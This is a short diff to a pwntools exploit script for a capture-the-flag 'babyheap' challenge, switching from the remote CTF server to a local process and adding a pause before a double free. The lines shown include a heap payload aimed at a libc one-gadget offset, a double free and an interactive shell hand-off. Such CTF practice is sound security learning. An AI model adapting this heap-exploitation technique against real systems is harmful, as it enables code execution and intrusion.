@@ -1,7 +1,7 @@
 from pwn import *
 
-#p = process('./babyheap')
-p = remote("ctf.j0n9hyun.xyz", 3030)
+p = process('./babyheap')
+#p = remote("ctf.j0n9hyun.xyz", 3030)
 e = ELF('./babyheap')
 l = ELF('./libc.so.6')
 
@@ -48,6 +48,7 @@ malloc(size,1)
 
 malloc(size, 'a' * 0x13 + p64(libc +0xf02a4))
 free(1)
+pause()
 free(1)
 
 p.interactive()
